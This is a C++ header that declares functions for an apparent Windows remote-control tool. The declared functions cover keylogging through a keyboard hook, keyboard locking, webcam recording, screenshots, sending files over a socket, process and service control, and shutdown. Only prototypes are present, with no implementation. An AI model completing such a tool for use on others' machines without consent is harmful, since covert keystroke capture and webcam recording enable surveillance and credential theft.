#pragma once
#include <iostream>
#include <vector>
#include <string>
#include <windows.h>
#include <map>
#include <nlohmann/json.hpp>
#include <sstream>
#include <set>
#include <fstream>
#include <iomanip>
#include <fcntl.h>
#include <io.h>
#include <filesystem>
#include <locale>
#include <thread>
#include <atomic>
#include <opencv2/opencv.hpp>
#include <opencv2/core/utils/logger.hpp>
#include <chrono>

using namespace std;
using json = nlohmann::json;

extern HHOOK keyboardHook;
extern BOOL isConnected;
extern atomic<bool> isRecording;
extern thread webcamThread;

const string DATA_FILE = "data.bin";
const string VIDEO_FILE = "record.mp4";

// start app
string startApp(string);

// stop app
string stopApp(string);

// list app
json listApp();
void writeAppListToFile(const vector<vector<string>>& apps);
vector<vector<string>> getRunningApps();

// start service
string startService(string);

// stop service
string stopService(string);

// list service
json listService();
string convertWideCharToString(LPCWSTR wideCharStr);
string getServiceDescription(SC_HANDLE hService);
string truncateString(const string& str, size_t maxLength);
vector<pair<string, tuple<int, string, string>>> listAllServices();
void writeServiceListToFile(const vector<pair<string, tuple<int, string, string>>>& services);

// list process
json listProcess();

// get file
bool sendFile(SOCKET&, string);

// copy file
string copyFile(const string&, const string&);

// delete file
string deleteFile(string& filePath);

// take screenshot
HBITMAP captureScreen(int& screenWidth, int& screenHeight);
bool saveScreenshotToFile(HBITMAP hBitmap, int width, int height);
bool takeScreenshot();

// keylogger
map<int, string> createKeyMap();
vector<string> collectKeyNames(int);
void writeKeyNamesToFile(vector<string>&);
json keylogger(int);

// lock keyboard
LRESULT CALLBACK processLowLevelKeyboard(int nCode, WPARAM wParam, LPARAM lParam);
bool lockKeyboard();
string lockKey(bool& flag);
void runKeyLockingLoop();

// unlock keyboard
bool unlockKeyboard();
string unlockKey();

// shutdown
void shutdown();

// restart
void restart();

// list directory tree
bool isHiddenOrSystem(const filesystem::path&);
void printDirectoryTree(const filesystem::path&, wofstream&, int, int, int);
bool listDrivesAndPrintTree();
json listDirectoryTree();

// webcam
bool createWebcamVideo(int);
string turnOnWebcam();
json turnOffWebcam();
